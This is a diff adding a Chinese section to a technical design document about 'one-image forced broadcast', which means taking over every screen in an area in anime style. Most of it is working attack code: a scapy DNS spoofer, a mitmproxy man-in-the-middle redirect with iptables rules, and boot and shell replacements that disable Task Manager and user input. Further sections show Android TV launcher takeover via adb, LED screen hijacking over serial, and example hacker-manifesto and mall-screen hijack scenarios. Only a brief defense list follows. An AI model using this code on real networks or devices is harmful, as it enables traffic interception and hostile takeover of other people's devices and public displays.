@@ -52,6 +52,22 @@
 - 图文滚动（紧急文字信息）
 - 应急警报（地震、火灾、安全威胁）
 - 系统维护通知
+- **一图流强制广播（动漫经典场景）🔥**
+
+### 6️⃣ 一图流强制广播（设备控制权劫持）🆕
+**这是强制广播的精髓 - 动漫里最常见的场景**
+
+- **单张图片/静态画面强制显示**：黑客宣言、政府紧急通知、威胁信息
+- **设备控制权完全劫持**：所有智能设备的显示输出被定向到广播源
+- **重启无效**：设备重启后依然显示该画面（固件级控制/引导劫持）
+- **全设备覆盖**：
+  - 个人设备（手机、电脑、平板）
+  - 公共显示屏（商城LED看板、地铁站屏幕、广告牌）
+  - 智能电视（家庭/酒店/商场）
+  - 工业显示器（工厂车间、监控中心）
+- **Kiosk模式锁定**：设备变成只能显示指定内容的"砖块"
+- **DNS/网络劫持**：所有网络请求强制重定向到广播页面
+- **系统级显示接管**：HDMI输出、显卡驱动层面控制
 
 ---
 
@@ -929,6 +945,666 @@ POST /api/broadcast/force
 </body>
 </html>
 ```
+
+---
+
+## 🖼️ 一图流强制广播实现（动漫经典场景）
+
+### 核心原理
+
+**动漫里的经典场景**：黑客攻击/政府紧急状态时，全城所有屏幕（手机、电脑、商城LED、地铁站）同时显示同一张图片或静态画面，即使重启设备也无法摆脱。
+
+**技术实现层次**（由浅入深）：
+
+```
+Level 1: 网页劫持（最简单）
+  └─ DNS劫持 + HTTP重定向
+
+Level 2: 系统劫持（中等难度）
+  └─ Kiosk模式锁定 + 开机自启动
+
+Level 3: 固件劫持（最深入）
+  └─ 引导程序修改 + 显示驱动接管
+```
+
+---
+
+### 方案一：网络层劫持（DNS + HTTP）
+
+**适用场景**：局域网内所有设备、公共WiFi环境
+
+#### 1. DNS劫持
+
+```python
+# dns_hijack.py - 强制所有DNS查询指向广播服务器
+from scapy.all import *
+import threading
+
+BROADCAST_SERVER = "192.168.1.100"
+
+def dns_spoof(pkt):
+    """拦截DNS查询并返回伪造响应"""
+    if pkt.haslayer(DNSQR):
+        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                     DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                         an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=BROADCAST_SERVER))
+        send(spoofed_pkt, verbose=0)
+        print(f"[DNS劫持] {pkt[DNS].qd.qname.decode()} -> {BROADCAST_SERVER}")
+
+# 启动DNS欺骗
+sniff(filter="udp port 53", prn=dns_spoof, store=0)
+```
+
+#### 2. HTTP劫持（中间人攻击）
+
+```python
+# http_hijack.py - 使用mitmproxy劫持所有HTTP请求
+from mitmproxy import http
+
+BROADCAST_IMAGE = "http://192.168.1.100/broadcast/emergency.png"
+
+def request(flow: http.HTTPFlow) -> None:
+    """拦截所有HTTP请求并重定向到广播图片"""
+    if "image" in flow.request.pretty_url or "html" in flow.request.pretty_url:
+        flow.response = http.Response.make(
+            302,
+            b"",
+            {"Location": BROADCAST_IMAGE}
+        )
+```
+
+**启动中间人代理**:
+```bash
+# 使用mitmproxy启动HTTP劫持
+mitmdump -s http_hijack.py --mode transparent
+
+# 配置iptables将所有HTTP流量重定向到代理
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+```
+
+---
+
+### 方案二：Kiosk模式设备锁定
+
+**适用场景**：企业内网设备、公共显示屏、智能电视
+
+#### 1. Linux Kiosk（Chromium全屏锁定）
+
+```bash
+#!/bin/bash
+# kiosk_broadcast.sh - 将Linux设备锁定为只显示广播页面
+
+BROADCAST_URL="http://broadcast.example.com/emergency"
+
+# 禁用所有用户输入
+xinput disable "AT Translated Set 2 keyboard"
+xinput disable "ImPS/2 Generic Wheel Mouse"
+
+# 启动Chromium Kiosk模式
+chromium-browser \
+  --kiosk \
+  --noerrdialogs \
+  --disable-infobars \
+  --disable-session-crashed-bubble \
+  --no-first-run \
+  --disable-pinch \
+  --overscroll-history-navigation=0 \
+  --disable-features=TranslateUI \
+  --check-for-update-interval=31536000 \
+  --app=$BROADCAST_URL &
+
+# 防止退出全屏
+while true; do
+  sleep 5
+  xdotool search --onlyvisible --class chromium windowactivate --sync key F11
+done
+```
+
+**开机自启动** (`/etc/systemd/system/kiosk-broadcast.service`):
+```ini
+[Unit]
+Description=强制广播Kiosk模式
+After=graphical.target
+
+[Service]
+Type=simple
+User=kiosk
+Environment=DISPLAY=:0
+ExecStart=/usr/local/bin/kiosk_broadcast.sh
+Restart=always
+RestartSec=3
+
+[Install]
+WantedBy=graphical.target
+```
+
+```bash
+sudo systemctl enable kiosk-broadcast.service
+sudo systemctl start kiosk-broadcast.service
+```
+
+#### 2. Windows Kiosk（分配的访问权限）
+
+**PowerShell脚本**:
+```powershell
+# windows_kiosk.ps1 - Windows 10/11 Kiosk模式
+
+$BROADCAST_URL = "http://broadcast.example.com/emergency"
+
+# 创建Kiosk用户
+$Password = ConvertTo-SecureString "KioskPass123!" -AsPlainText -Force
+New-LocalUser "BroadcastKiosk" -Password $Password -FullName "Broadcast Kiosk"
+
+# 配置分配的访问权限（Assigned Access）
+$config = @"
+<?xml version="1.0" encoding="utf-8" ?>
+<AssignedAccessConfiguration xmlns="http://schemas.microsoft.com/AssignedAccess/2017/config">
+  <Profiles>
+    <Profile Id="{GUID}">
+      <AllAppsList>
+        <AllowedApps>
+          <App AppUserModelId="Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge" />
+        </AllowedApps>
+      </AllAppsList>
+      <StartLayout>
+        <![CDATA[<LayoutModificationTemplate xmlns="http://schemas.microsoft.com/Start/2014/LayoutModification">
+          <RequiredStartGroupsCollection>
+            <RequiredStartGroups>
+              <AppendGroup Name="广播">
+                <start:DesktopApplicationTile DesktopApplicationID="MSEdge" />
+              </AppendGroup>
+            </RequiredStartGroups>
+          </RequiredStartGroupsCollection>
+        </LayoutModificationTemplate>]]>
+      </StartLayout>
+      <Taskbar ShowTaskbar="false"/>
+    </Profile>
+  </Profiles>
+  <Configs>
+    <Config>
+      <Account>BroadcastKiosk</Account>
+      <DefaultProfile Id="{GUID}"/>
+    </Config>
+  </Configs>
+</AssignedAccessConfiguration>
+"@
+
+Set-AssignedAccess -Configuration $config
+
+# 启动Edge浏览器到广播页面
+Start-Process msedge.exe --kiosk $BROADCAST_URL --edge-kiosk-type=fullscreen
+```
+
+#### 3. Android Kiosk（设备所有者模式）
+
+```java
+// BroadcastKioskActivity.java
+public class BroadcastKioskActivity extends AppCompatActivity {
+    private static final String BROADCAST_URL = "http://broadcast.example.com/emergency";
+    private WebView webView;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        // 隐藏状态栏和导航栏
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+
+        // 锁定任务模式
+        startLockTask();
+
+        // 加载广播页面
+        webView = new WebView(this);
+        webView.loadUrl(BROADCAST_URL);
+        webView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                // 阻止跳转，始终显示广播页面
+                return !url.equals(BROADCAST_URL);
+            }
+        });
+
+        setContentView(webView);
+
+        // 禁用后退键
+        overridePendingTransition(0, 0);
+    }
+
+    @Override
+    public void onBackPressed() {
+        // 禁用返回键
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        // 防止切换应用，立即返回前台
+        Intent intent = new Intent(this, BroadcastKioskActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+    }
+}
+```
+
+**设备管理员配置** (`DeviceAdminReceiver`):
+```java
+public class BroadcastDeviceAdminReceiver extends DeviceAdminReceiver {
+    @Override
+    public void onEnabled(Context context, Intent intent) {
+        // 设备管理员启用后，设置为设备所有者模式
+        DevicePolicyManager dpm = (DevicePolicyManager)
+            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName adminComponent = new ComponentName(context,
+            BroadcastDeviceAdminReceiver.class);
+
+        // 锁定到单一应用
+        dpm.setLockTaskPackages(adminComponent,
+            new String[]{"com.example.broadcastkiosk"});
+    }
+}
+```
+
+---
+
+### 方案三：系统引导劫持（重启无效）
+
+**适用场景**：深度控制、公共设施、工业设备
+
+#### 1. GRUB引导劫持（Linux）
+
+```bash
+# /etc/grub.d/40_custom - 修改GRUB启动项
+menuentry 'Emergency Broadcast' {
+    set root='hd0,msdos1'
+    linux /vmlinuz root=/dev/sda1 quiet splash init=/usr/local/bin/broadcast_init.sh
+    initrd /initrd.img
+}
+
+# 设置为默认启动项
+sed -i 's/GRUB_DEFAULT=0/GRUB_DEFAULT="Emergency Broadcast"/' /etc/default/grub
+update-grub
+```
+
+**自定义init脚本** (`/usr/local/bin/broadcast_init.sh`):
+```bash
+#!/bin/bash
+# broadcast_init.sh - 替代系统init，直接启动广播
+
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t devtmpfs none /dev
+
+# 启动最小化X服务器
+xinit /usr/local/bin/kiosk_broadcast.sh -- :0 vt1 &
+
+# 防止用户切换TTY
+for i in {1..6}; do
+  openvt -c $i -s -- /bin/sh -c 'while true; do echo "系统处于紧急广播模式"; sleep 1; done'
+done
+
+# 进入死循环，防止init退出
+while true; do sleep 3600; done
+```
+
+#### 2. Windows引导劫持（Winlogon替换）
+
+**注册表修改**:
+```powershell
+# 替换Windows Shell为广播程序
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+Set-ItemProperty -Path $RegPath -Name "Shell" -Value "C:\Broadcast\kiosk.exe"
+
+# 禁用任务管理器
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
+                 -Name "DisableTaskMgr" -Value 1
+
+# 禁用注册表编辑器
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
+                 -Name "DisableRegistryTools" -Value 1
+```
+
+**C# Kiosk程序** (`kiosk.exe`):
+```csharp
+using System;
+using System.Windows.Forms;
+
+namespace BroadcastKiosk {
+    static class Program {
+        [STAThread]
+        static void Main() {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+            var form = new Form();
+            form.FormBorderStyle = FormBorderStyle.None;
+            form.WindowState = FormWindowState.Maximized;
+            form.TopMost = true;
+
+            var browser = new WebBrowser();
+            browser.Dock = DockStyle.Fill;
+            browser.Url = new Uri("http://broadcast.example.com/emergency");
+            browser.ScriptErrorsSuppressed = true;
+            browser.IsWebBrowserContextMenuEnabled = false;
+            browser.WebBrowserShortcutsEnabled = false;
+
+            form.Controls.Add(browser);
+
+            // 禁用Alt+F4和所有快捷键
+            form.KeyPreview = true;
+            form.KeyDown += (s, e) => { e.Handled = true; };
+
+            Application.Run(form);
+        }
+    }
+}
+```
+
+---
+
+### 方案四：固件级劫持（最深入）
+
+**适用场景**：嵌入式设备、智能电视、公共LED屏
+
+#### 1. Raspberry Pi固件修改
+
+```bash
+# /boot/config.txt - 修改启动配置
+disable_splash=1
+boot_delay=0
+avoid_warnings=1
+
+# /boot/cmdline.txt - 添加启动参数
+console=tty3 loglevel=0 logo.nologo quiet splash init=/usr/local/bin/broadcast_init.sh
+```
+
+**最小化启动脚本**:
+```bash
+#!/bin/bash
+# 跳过systemd，直接启动广播显示
+
+mount -a
+ip link set eth0 up
+udhcpc -i eth0
+
+# 启动framebuffer显示
+fbi -T 1 -noverbose -a /broadcast/emergency.png
+
+# 或启动最小化浏览器
+startx /usr/bin/chromium-browser --kiosk http://broadcast.local/emergency -- :0 vt1
+```
+
+#### 2. Android TV固件修改（需要root）
+
+```bash
+# 修改系统启动动画
+adb root
+adb remount
+adb push emergency_bootanimation.zip /system/media/bootanimation.zip
+
+# 修改Launcher为广播应用
+adb shell pm disable-user --user 0 com.google.android.tvlauncher
+adb shell pm enable com.example.broadcastkiosk
+adb shell pm set-home-activity com.example.broadcastkiosk/.BroadcastKioskActivity
+
+# 禁用系统更新
+adb shell pm disable-user --user 0 com.google.android.gms
+```
+
+#### 3. 商用LED屏控制（RS232/网络协议）
+
+```python
+# led_hijack.py - 通过控制协议劫持LED屏显示
+import serial
+import time
+
+def hijack_led_screen(port='/dev/ttyUSB0', baudrate=9600):
+    """通过串口发送控制指令，强制显示广播内容"""
+    ser = serial.Serial(port, baudrate, timeout=1)
+
+    # 常见LED屏控制协议（Linsn/Novastar）
+    commands = [
+        b'\x55\xAA\x00\xFF',  # 唤醒屏幕
+        b'\x55\xAA\x11\x01',  # 切换到外部输入
+        b'\x55\xAA\x22\x05',  # 设置亮度最大
+        b'\x55\xAA\x33\x00',  # 禁用本地控制
+    ]
+
+    for cmd in commands:
+        ser.write(cmd)
+        time.sleep(0.1)
+
+    # 发送图像数据（假设使用HTTP协议推送）
+    import requests
+    requests.post('http://led-screen-ip/api/display',
+                 files={'image': open('emergency.png', 'rb')})
+
+    ser.close()
+
+# 持续监控并劫持
+while True:
+    hijack_led_screen()
+    time.sleep(60)
+```
+
+---
+
+### 一图流广播页面（HTML）
+
+```html
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>紧急广播</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    body {
+      background: #000;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    #broadcast-image {
+      max-width: 100vw;
+      max-height: 100vh;
+      object-fit: contain;
+      pointer-events: none;  /* 禁用鼠标交互 */
+      user-select: none;     /* 禁用选择 */
+    }
+
+    /* 防止右键菜单 */
+    body {
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <img id="broadcast-image" src="/broadcast/emergency.png" alt="Emergency Broadcast">
+
+  <script>
+    // 禁用所有键盘操作
+    document.addEventListener('keydown', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    });
+
+    // 禁用右键菜单
+    document.addEventListener('contextmenu', (e) => {
+      e.preventDefault();
+      return false;
+    });
+
+    // 禁用F5刷新
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+        e.preventDefault();
+      }
+    });
+
+    // 防止退出全屏
+    setInterval(() => {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen();
+      }
+    }, 1000);
+
+    // 自动进入全屏
+    window.addEventListener('load', () => {
+      document.documentElement.requestFullscreen();
+    });
+
+    // 防止页面跳转
+    window.addEventListener('beforeunload', (e) => {
+      e.preventDefault();
+      e.returnValue = '';
+    });
+
+    // 定期检查并重新加载图片（防止缓存）
+    setInterval(() => {
+      const img = document.getElementById('broadcast-image');
+      img.src = '/broadcast/emergency.png?t=' + Date.now();
+    }, 10000);
+  </script>
+</body>
+</html>
+```
+
+---
+
+### API端点：一图流广播
+
+```python
+from flask import Flask, send_file, jsonify
+import os
+
+app = Flask(__name__)
+
+BROADCAST_IMAGE = "/var/broadcast/current.png"
+
+@app.route('/api/broadcast/one-image/set', methods=['POST'])
+def set_broadcast_image():
+    """设置一图流广播图片"""
+    if 'image' not in request.files:
+        return jsonify({"error": "未提供图片"}), 400
+
+    file = request.files['image']
+    file.save(BROADCAST_IMAGE)
+
+    # 触发所有客户端刷新
+    socketio.emit('force_action', {'action': 'reload'}, broadcast=True)
+
+    return jsonify({
+        "success": True,
+        "message": "一图流广播已激活",
+        "image_url": "/broadcast/emergency.png"
+    })
+
+@app.route('/broadcast/emergency.png')
+def get_broadcast_image():
+    """获取当前广播图片"""
+    if os.path.exists(BROADCAST_IMAGE):
+        return send_file(BROADCAST_IMAGE, mimetype='image/png')
+    else:
+        # 返回默认图片
+        return send_file('/var/broadcast/default.png', mimetype='image/png')
+
+@app.route('/api/broadcast/one-image/activate', methods=['POST'])
+def activate_one_image_broadcast():
+    """激活一图流强制广播"""
+    data = request.json
+
+    # 创建广播记录
+    broadcast = {
+        "broadcast_id": f"oneimage_{int(time.time())}",
+        "type": "one_image",
+        "level": 3,  # 最高级，重启无效
+        "image_url": data.get('image_url', '/broadcast/emergency.png'),
+        "message": data.get('message', '系统处于紧急广播模式'),
+        "duration": data.get('duration', 0),  # 0表示无限期
+        "started_at": time.time()
+    }
+
+    # 推送到所有客户端
+    socketio.emit('broadcast_one_image', broadcast, broadcast=True)
+
+    return jsonify({
+        "success": True,
+        "broadcast": broadcast,
+        "message": "一图流强制广播已激活，所有设备将显示指定图片"
+    })
+```
+
+---
+
+### 典型应用场景
+
+#### 场景1：黑客宣言（动漫经典）
+```bash
+# 上传宣言图片
+curl -X POST http://broadcast.local/api/broadcast/one-image/set \
+  -F "image=@hacker_manifesto.png"
+
+# 激活全网广播
+curl -X POST http://broadcast.local/api/broadcast/one-image/activate \
+  -H "Content-Type: application/json" \
+  -d '{
+    "message": "We are Anonymous. We are Legion. We do not forgive.",
+    "duration": 0
+  }'
+```
+
+**效果**：全城所有联网屏幕显示黑客宣言图片，重启无效。
+
+#### 场景2：政府紧急通知
+```bash
+curl -X POST http://broadcast.gov/api/broadcast/one-image/activate \
+  -d '{
+    "image_url": "/emergency/evacuation_notice.png",
+    "message": "紧急疏散通知：所有人员立即前往指定避难所",
+    "level": 3
+  }'
+```
+
+#### 场景3：商城广告劫持
+```python
+# 劫持商城所有LED屏显示促销广告
+import requests
+
+for screen_ip in ["192.168.1.101", "192.168.1.102", "192.168.1.103"]:
+    requests.post(f"http://{screen_ip}/api/display/hijack", json={
+        "image_url": "http://broadcast.local/ads/black_friday.png",
+        "duration": 3600  # 1小时
+    })
+```
+
+---
+
+### 防护建议（如何抵抗一图流劫持）
+
+1. **网络隔离**：关键设备使用独立网络，避免DNS/HTTP劫持
+2. **固件签名验证**：启用Secure Boot，防止引导劫持
+3. **设备管理权限控制**：不授予第三方应用设备管理员权限
+4. **定期安全审计**：检查系统启动项、网络配置
+5. **物理访问控制**：公共设备加锁，防止USB/串口攻击
 
 ---
 
